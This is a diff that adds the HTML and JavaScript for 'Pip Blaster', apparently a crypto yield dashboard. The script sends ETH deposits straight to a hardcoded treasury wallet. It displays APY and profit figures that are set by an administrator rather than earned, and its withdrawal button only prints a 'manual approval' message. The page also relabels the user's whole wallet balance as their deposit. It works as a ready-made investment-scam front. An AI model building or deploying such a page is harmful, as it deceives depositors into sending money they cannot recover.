@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Pip Blaster — Yield Dashboard</title>
+
+<script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.1/dist/index.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+
+<style>
+:root{
+--bg:#060b14;--card:rgba(15,22,38,.92);--glass:rgba(255,255,255,.06);
+--accent:#00ffd1;--accent2:#6ae3ff;--muted:#9aa4b2}
+*{box-sizing:border-box}
+body{margin:0;background:radial-gradient(1200px 600px at 10% -10%,#0f1d3a,transparent),
+radial-gradient(900px 500px at 90% 10%,#082b2f,transparent),var(--bg);
+font-family:Inter,system-ui,sans-serif;color:#fff}
+.wrapper{display:flex;justify-content:center;padding:48px 16px 140px}
+.container{width:100%;max-width:980px}
+.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:28px}
+.logo{display:flex;align-items:center;gap:12px;font-weight:800;font-size:20px}
+.logo-mark{width:42px;height:42px;border-radius:14px;
+background:linear-gradient(135deg,var(--accent),var(--accent2));
+display:flex;align-items:center;justify-content:center;color:#000;font-weight:900}
+.card{background:var(--card);border-radius:22px;padding:28px;
+box-shadow:0 40px 120px rgba(0,0,0,.7)}
+.grid{display:grid;grid-template-columns:2fr 1fr;gap:24px}
+@media(max-width:900px){.grid{grid-template-columns:1fr}}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin:22px 0}
+.stat{background:var(--glass);border-radius:18px;padding:18px;text-align:center}
+.stat span{font-size:22px;font-weight:700;color:var(--accent)}
+.stat small{display:block;font-size:12px;color:var(--muted);margin-top:6px}
+.profit{background:linear-gradient(135deg,rgba(0,255,209,.12),rgba(106,227,255,.08));
+border-radius:20px;padding:22px;margin-bottom:22px}
+.profit .value{font-size:28px;font-weight:800;color:var(--accent)}
+button{width:100%;background:linear-gradient(135deg,var(--accent),var(--accent2));
+border:none;padding:14px;border-radius:14px;font-weight:700;cursor:pointer;color:#000}
+button.secondary{background:rgba(255,255,255,.1);color:#fff}
+input{width:100%;padding:14px;border-radius:12px;border:none;margin-bottom:12px}
+.status{margin-top:14px;font-size:13px;color:var(--accent)}
+.disclaimer{margin-top:26px;font-size:11px;color:#7e8896}
+.telegram-float{position:fixed;bottom:22px;right:22px;background:#0088cc;
+color:white;width:60px;height:60px;border-radius:50%;
+display:flex;align-items:center;justify-content:center;
+font-size:26px;text-decoration:none}
+</style>
+</head>
+
+<body>
+<div class="wrapper"><div class="container">
+
+<div class="header">
+<div class="logo"><div class="logo-mark">PB</div><div>Pip Blaster</div></div>
+<button class="secondary" onclick="connectWallet()">Connect Wallet</button>
+</div>
+
+<div class="table" id="recentActivity">
+  <div class="row">No recent activity</div>
+</div>
+
+<div class="grid">
+<div class="card">
+<h2>Yield Performance</h2>
+<div class="stats">
+<div class="stat"><span id="targetApy">--</span><small>Target APY</small></div>
+<div class="stat"><span id="activeApy">--</span><small>Active APY</small></div>
+<div class="stat"><span id="dailyPerf">--</span><small>Daily Performance</small></div>
+</div>
+
+<div class="profit">
+<div>Your Estimated Profit</div>
+<div class="value" id="userProfit">$0.00</div>
+</div>
+</div>
+
+<div class="card">
+<div id="wallet">Not connected</div><br>
+<input id="amount" type="number" placeholder="Amount in ETH"/>
+<button onclick="deposit()">Deposit</button><br><br>
+<input id="withdrawAddress" placeholder="Wallet address"/>
+<button class="secondary" onclick="requestWithdrawal()">Request Withdrawal</button>
+<div class="status" id="status"></div>
+<div class="disclaimer">
+Deposits go to a treasury wallet controlled by Pip Blaster.
+</div>
+</div>
+</div>
+</div></div>
+
+<a class="telegram-float" href="https://t.me/YOUR_TELEGRAM" target="_blank">
+<i class="fab fa-telegram-plane"></i></a>
+
+<script>
+const TREASURY_ADDRESS="0xac6Ac19C9773DC39300C5531984498fe3477E7D0";
+
+let userAddress;
+let provider;
+
+// Load admin-set data from localStorage
+let userProfits = JSON.parse(localStorage.getItem("userProfits") || "{}");
+let globalMetrics = JSON.parse(localStorage.getItem("globalMetrics") || {targetApy:"40%", activeApy:"28%", dailyPerf:"+0.8%"});
+
+// CONNECT WALLET
+async function connectWallet(){
+    if(typeof window.ethereum!=='undefined'){
+        provider = new ethers.BrowserProvider(window.ethereum);
+        const accounts = await provider.send("eth_requestAccounts", []);
+        userAddress = accounts[0];
+        wallet.textContent = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
+        renderDashboard();
+        return;
+    }
+
+    const wcProvider = await EthereumProvider.init({
+        projectId:"fc500f0e843b93390b632d69567865db",
+        chains:[1],
+        showQrModal:true
+    });
+    await wcProvider.enable();
+    window.ethereum = wcProvider;
+    provider = new ethers.BrowserProvider(window.ethereum);
+    userAddress = wcProvider.accounts[0];
+    wallet.textContent = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
+    renderDashboard();
+}
+
+// DEPOSIT
+async function deposit(){
+    if(!userAddress) return alert("Connect wallet");
+    const eth = amount.value;
+    if(!eth || eth <= 0) return alert("Enter valid amount");
+    const value = "0x"+(eth*1e18).toString(16);
+    await ethereum.request({
+        method:"eth_sendTransaction",
+        params:[{from:userAddress, to:TREASURY_ADDRESS, value}]
+    });
+    status.textContent="Deposit sent";
+    renderDashboard();
+}
+
+// WITHDRAW REQUEST (manual)
+function requestWithdrawal(){
+    status.textContent="Withdrawal requested (manual approval)";
+}
+
+// LOAD DASHBOARD DATA
+async function renderDashboard(){
+    // Load metrics from admin
+    targetApy.textContent = globalMetrics.targetApy;
+    activeApy.textContent = globalMetrics.activeApy;
+    dailyPerf.textContent = globalMetrics.dailyPerf;
+
+    if(!userAddress) return;
+
+    try {
+        const balanceWei = await provider.getBalance(userAddress);
+        const balanceEth = ethers.formatEther(balanceWei);
+        const profit = userProfits[userAddress] || "$0.00";
+        recentActivity.innerHTML = `<div class="row">${userAddress}: Deposit ${balanceEth} ETH, Profit ${profit}</div>`;
+        userProfit.textContent = profit;
+    } catch(e){
+        console.error(e);
+        recentActivity.innerHTML = `<div class="row">Unable to load deposit</div>`;
+    }
+}
+
+// Refresh global metrics and profits if admin updates localStorage
+setInterval(() => {
+    userProfits = JSON.parse(localStorage.getItem("userProfits") || "{}");
+    globalMetrics = JSON.parse(localStorage.getItem("globalMetrics") || {targetApy:"40%", activeApy:"28%", dailyPerf:"+0.8%"});
+    renderDashboard();
+}, 5000);
+</script>
+</body>
+</html>
